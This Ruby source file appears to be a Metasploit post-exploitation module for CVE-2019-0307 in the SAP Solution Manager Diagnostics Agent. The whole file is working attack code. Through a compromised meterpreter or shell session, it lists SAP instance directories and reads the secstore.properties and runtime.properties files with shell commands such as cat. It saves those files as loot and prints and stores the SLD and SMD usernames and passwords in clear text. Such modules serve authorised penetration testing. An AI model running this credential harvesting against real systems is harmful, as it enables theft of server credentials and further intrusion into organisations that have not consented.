##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'resolv'

class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Exploit::Local::SapSmdAgentUnencryptedProperty

  SECSTORE_FILE = 'secstore.properties'.freeze
  RUNTIME_FILE = 'runtime.properties'.freeze

  WIN_PREFIX = 'c:\\usr\\sap\\DAA\\'.freeze
  UNIX_PREFIX = '/usr/sap/DAA/'.freeze

  WIN_SUFFIX = '\\SMDAgent\\configuration\\'.freeze
  UNIX_SUFFIX = '/SMDAgent/configuration/'.freeze

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Diagnostics Agent in Solution Manager, stores unencrypted credentials for Solution Manager server',
        'Description' => %q{
          If a SMDAgent has CVE-2019-0307 vulnerability, attackers can obtain its secstore.properties configuration file,
          which contains the credentials for the SAP Solution Manager server to which this SMDAgent is connected.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'Yvan Genuer', # @_1ggy The researcher who originally found this vulnerability
          'Vladimir Ivanov' # @_generic_human_ This Metasploit module
        ],
        'Platform' => %w[bsd linux osx unix win],
        'SessionTypes' => %w[meterpreter shell],
        'References' => [
          [ 'CVE', '2019-0307' ],
          [ 'URL', 'https://conference.hitb.org/hitblockdown002/materials/D2T1%20-%20SAP%20RCE%20-%20The%20Agent%20Who%20Spoke%20Too%20Much%20-%20Yvan%20Genuer.pdf' ]
        ]
      )
    )
  end

  def run
    case session.type
    when 'meterpreter'
      meterpreter = true
    else
      meterpreter = false
    end
    case session.platform
    when 'windows'
      windows = true
      instances = list_dir(WIN_PREFIX, windows, meterpreter)
    else
      windows = false
      instances = list_dir(UNIX_PREFIX, windows, meterpreter)
    end

    if (instances == '') || instances.nil? || instances.empty?
      fail_with(Failure::NotFound, 'SAP root directory not found')
    end

    instances.each do |instance|
      next if instance == 'SYS'

      next if instance.include? ' '

      next if instance.include? '.'

      next if instance.include? 'tmp'

      if windows
        runtime_properties_file_name = "#{WIN_PREFIX}#{instance}#{WIN_SUFFIX}#{RUNTIME_FILE}"
        secstore_properties_file_name = "#{WIN_PREFIX}#{instance}#{WIN_SUFFIX}#{SECSTORE_FILE}"
      else
        runtime_properties_file_name = "#{UNIX_PREFIX}#{instance}#{UNIX_SUFFIX}#{RUNTIME_FILE}"
        secstore_properties_file_name = "#{UNIX_PREFIX}#{instance}#{UNIX_SUFFIX}#{SECSTORE_FILE}"
      end

      runtime_properties = parse_properties_file(runtime_properties_file_name, windows, meterpreter)
      secstore_properties = parse_properties_file(secstore_properties_file_name, windows, meterpreter)

      next if runtime_properties.empty?

      print_line
      print_status("Instance: #{instance}")
      print_status("Runtime properties file name: #{runtime_properties_file_name}")
      print_status("Secstore properties file name: #{secstore_properties_file_name}")

      sld_protocol = nil
      sld_hostname = nil
      sld_address = nil
      sld_port = nil
      sld_username = nil
      sld_password = nil

      smd_url = nil
      smd_username = nil
      smd_password = nil

      # Parse runtime.properties file
      runtime_properties.each do |property|
        if property[:name] =~ /sld\./
          case property[:name]
          when /hostprotocol/
            sld_protocol = property[:value]
          when /hostname/
            sld_hostname = property[:value]
          when /hostport/
            sld_port = property[:value]
          end
        elsif property[:name] =~ /smd\./
          case property[:name]
          when /url/
            smd_url = property[:value].gsub(/\\:/, ':')
          end
        end
      end

      # Parse secstore.properties file
      secstore_properties.each do |property|
        if property[:name] =~ %r{sld/}
          case property[:name]
          when /usr/
            sld_username = property[:value]
          when /pwd/
            sld_password = property[:value]
          end
        elsif property[:name] =~ %r{smd/}
          case property[:name]
          when /User/
            smd_username = property[:value]
          when /Password/
            smd_password = property[:value]
          end
        end
      end

      # Print SLD properties
      if !sld_protocol.nil? || !sld_hostname.nil? || !sld_port.nil? || !sld_username.nil? || !sld_password.nil?
        print_line
        print_status('SLD properties:')
        unless sld_protocol.nil? then print_status("SLD protocol: #{sld_protocol}") end
        unless sld_hostname.nil?
          print_status("SLD hostname: #{sld_hostname}")
          if meterpreter
            if sld_hostname =~ Resolv::IPv4::Regex
              sld_address = sld_hostname
            else
              begin
                sld_address = session.net.resolve.resolve_host(sld_hostname)[:ip]
                print_status("SLD address: #{sld_address}")
              rescue Rex::Post::Meterpreter::RequestError
                print_error("Failed to resolve SLD hostname: #{sld_hostname}")
              end
            end
          end
        end
        unless sld_port.nil? then print_status("SLD port: #{sld_port}") end
        unless sld_username.nil? then print_good("SLD username: #{sld_username}") end
        unless sld_password.nil? then print_good("SLD password: #{sld_password}") end
      end

      # Print SMD properties
      if !smd_url.nil? || !smd_username.nil? || !smd_password.nil?
        print_line
        print_status('SMD properties:')
        unless smd_url.nil? then print_status("SMD url: #{smd_url}") end
        unless smd_username.nil? then print_good("SMD username: #{smd_username}") end
        unless smd_password.nil? then print_good("SMD password: #{smd_password}") end
      end

      # Store decoded credentials, report service and vuln
      print_line
      if sld_username.nil? || sld_password.nil?
        print_error("File #{secstore_properties_file_name} read, but this file is likely encrypted or does not contain credentials. This SMDAgent is likely patched.")
      else
        # Store decoded credentials
        print_good('Store decoded credentials for SolMan server')
        if sld_address.nil? || sld_port.nil?
          service_data = {}
        else
          service_data = {
            origin_type: :service,
            address: sld_address,
            port: sld_port,
            service_name: 'http',
            protocol: 'tcp'
          }
          # Report service
          report_service(
            host: sld_address,
            port: sld_port,
            name: 'http',
            proto: 'tcp',
            info: 'SAP Solution Manager'
          )
        end
        store_valid_credential(
          user: sld_username,
          private: sld_password,
          private_type: :password,
          service_data: service_data
        )
        # Report vulnerability
        if meterpreter
          agent_host = Rex::Socket.getaddress(session.sock.peerhost, true)
        else
          agent_host = session.session_host
        end
        report_vuln(
          host: agent_host,
          name: name,
          refs: references
        )
      end
    end
  end

  def list_dir(directory, is_windows, is_meterpreter)
    if is_meterpreter
      directories = session.fs.dir.foreach(directory).to_a
    else
      if is_windows
        command = "dir #{directory}"
      else
        command = "ls #{directory}"
      end
      directories = session.shell_command(command).split("\n")
    end
    directories
  end

  def read_file(filename, is_windows, is_meterpreter)
    if is_meterpreter
      file_content = session.fs.file.open(filename).read
    else
      if is_windows
        command = "more #{filename}"
      else
        command = "cat #{filename}"
      end
      file_content = session.shell_command(command)
    end
    file_content
  end

  def file_exist(filename, is_windows, is_meterpreter)
    if is_meterpreter
      exist = session.fs.file.exist?(filename)
    else
      if is_windows
        command = "more #{filename}"
      else
        command = "stat #{filename}"
      end
      stat = session.shell_command(command)
      if stat =~ /(no such file|cannot access file)/
        exist = false
      else
        exist = true
      end
    end
    exist
  end

  def parse_properties_file(filename, is_windows, is_meterpreter)
    properties = []
    if file_exist(filename, is_windows, is_meterpreter)
      properties_content = read_file(filename, is_windows, is_meterpreter)
      if properties_content.nil?
        print_error("Failed to read properties file: #{filename}")
      else
        if is_meterpreter
          agent_host = Rex::Socket.getaddress(session.sock.peerhost, true)
        else
          agent_host = session.session_host
        end
        loot = store_loot('smdagent.properties', 'text/plain', agent_host, properties_content, filename, 'SMD Agent properties file')
        print_good("File #{filename} saved in: #{loot}")
        properties = parse_properties(properties_content)
      end
    else
      print_error("File: #{filename} does not exist")
    end
    properties
  end

end
